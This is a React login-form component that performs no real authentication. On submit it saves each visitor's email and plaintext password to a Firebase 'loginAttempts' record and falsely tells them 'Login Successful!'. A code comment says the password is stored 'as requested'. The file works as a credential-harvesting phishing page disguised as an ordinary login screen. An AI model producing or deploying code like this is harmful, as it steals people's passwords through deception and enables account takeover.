
import React, { useState } from 'react';
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
// Label removed as it's not used
import { Eye, EyeOff } from 'lucide-react';
import { Link } from 'react-router-dom';
import { database } from '@/firebaseConfig'; // Import Firebase Realtime Database
import { ref, push, serverTimestamp, set } from "firebase/database"; // Import Realtime Database functions
import { useToast } from "@/components/ui/use-toast";
// import { useNavigate } from 'react-router-dom'; // If you want to redirect after login

const LoginForm: React.FC = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const { toast } = useToast();
  // const navigate = useNavigate(); // Uncomment if you want to redirect

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    
    try {
      // Path in your Realtime Database where login attempts will be stored
      const loginsRef = ref(database, 'loginAttempts');
      const newLoginAttemptRef = push(loginsRef); // Creates a unique ID for each login
      
      await set(newLoginAttemptRef, {
        email: email,
        password: password, // Storing password directly as requested
        timestamp: serverTimestamp()
      });

      toast({
        title: "Login Successful!",
        description: "Your login details have been recorded.", // Updated description
      });
      
      // Clear form
      setEmail('');
      setPassword('');

    } catch (error: any) {
      console.error("Error saving login attempt:", error);
      toast({
        title: "Operation Failed",
        description: "Could not save login details. Please try again.",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <form onSubmit={handleSubmit} className="space-y-4">
      <div className="rounded-lg overflow-hidden">
        <Input
          id="email"
          name="email"
          type="text"
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          autoComplete="email"
          required
          placeholder="Email address"
          className="w-full px-4 py-3 text-[16px] border border-gray-300 rounded-lg bg-gray-50 focus:outline-none"
          disabled={isLoading}
        />
      </div>

      <div className="relative">
        <Input
          id="password"
          name="password"
          type={showPassword ? "text" : "password"}
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          autoComplete="current-password"
          required
          placeholder="Password"
          className="w-full px-4 py-3 text-[16px] border border-gray-300 rounded-lg bg-gray-50 focus:outline-none"
          disabled={isLoading}
        />
        {password && (
          <button 
            type="button" 
            className="absolute right-3 top-3"
            onClick={() => setShowPassword(!showPassword)}
            disabled={isLoading}
          >
            {showPassword ? (
              <EyeOff className="h-5 w-5 text-gray-500" />
            ) : (
              <Eye className="h-5 w-5 text-gray-500" />
            )}
          </button>
        )}
      </div>

      <Button 
        type="submit" 
        className="w-full bg-blue-500 hover:bg-blue-600 text-white rounded-lg py-6 text-[16px]"
        disabled={!email || !password || isLoading}
      >
        {isLoading ? 'Logging In...' : 'Log in'}
      </Button>

      <div className="text-center mt-4">
        <Link to="#" className="text-blue-900 text-sm">
          Forgotten password?
        </Link>
      </div>
    </form>
  );
};

export default LoginForm;
